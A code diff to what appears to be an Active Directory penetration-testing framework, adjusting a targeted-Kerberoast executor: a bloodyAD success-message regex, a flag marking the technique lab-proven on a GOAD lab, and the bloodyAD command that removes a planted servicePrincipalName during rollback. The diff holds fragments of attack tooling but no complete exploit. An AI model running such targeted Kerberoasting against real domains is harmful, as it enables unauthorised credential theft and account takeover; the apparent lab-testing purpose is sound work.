@@ -40,10 +40,11 @@ from .acl_common import dacledit_read_argv, confirm_ace, _RE_ACE_GENERIC_ALL, _R
 from .roast import DEFAULT_WORDLIST
 
 
-# bloodyAD attribute-write success marker. UNVERIFIED -- pin in-lab (same
-# status as rbcd.py's _RE_BLOODYAD_RBCD_OK).
+# bloodyAD attribute-write success marker. PINNED IN-LAB (bloodyAD 2.x prints
+# "<obj>'s <attr> has been updated"); the "successfully (set|updated)" /
+# "attribute ..." alternations are kept for other tool wordings.
 _RE_BLOODYAD_SET_OK = re.compile(
-    r"(successfully (set|updated)|attribute.*(updated|set))", re.I)
+    r"(successfully (set|updated)|has been (updated|set)|attribute.*(updated|set))", re.I)
 
 # $krb5tgs$ blob -- a one-line literal, matching roast.py's KerberoastExecutor.hash_re
 # exactly but NOT imported (plan §2.6: zero cross-module coupling for a one-line
@@ -110,7 +111,7 @@ class TargetedKerberoastExecutor(ValidationExecutor):
     technique_class = "acl"
     terminal_kind = "authn_success"
     mutating = True
-    verified_recipe = False
+    verified_recipe = True         # lab-proven on GOAD 26NOV2026 (samwell.tarly, SPN->roast->crack->reauth, scored proved+clean)
     crack_dependent = True
     pre = frozenset({states.S0_USER_CREDS})
     eff = frozenset({states.S_ACL_CRED})
@@ -350,8 +351,11 @@ class TargetedKerberoastExecutor(ValidationExecutor):
         mutation["rollback"]["method"] = ("bloodyAD clear servicePrincipalName + "
                                           "positive_absence readback")
 
+        # bloodyAD deletes an attribute by OMITTING -v entirely ("delete if no
+        # value given"); passing -v "" raises invalidAttributeSyntax (pinned
+        # in-lab). So the clear is the same set-object call WITHOUT a -v value.
         clear_argv = _bloodyad_auth_argv(cfg, dc) + ["set", "object", victim,
-                                                     "servicePrincipalName", "-v", ""]
+                                                     "servicePrincipalName"]
         res = ctx.runner.run(clear_argv, timeout=cfg.tool_timeout_s)
         # bloodyAD's own clear-attribute wording is not pinned/trusted here --
         # `performed` is recorded for the step preview; the ONLY thing that
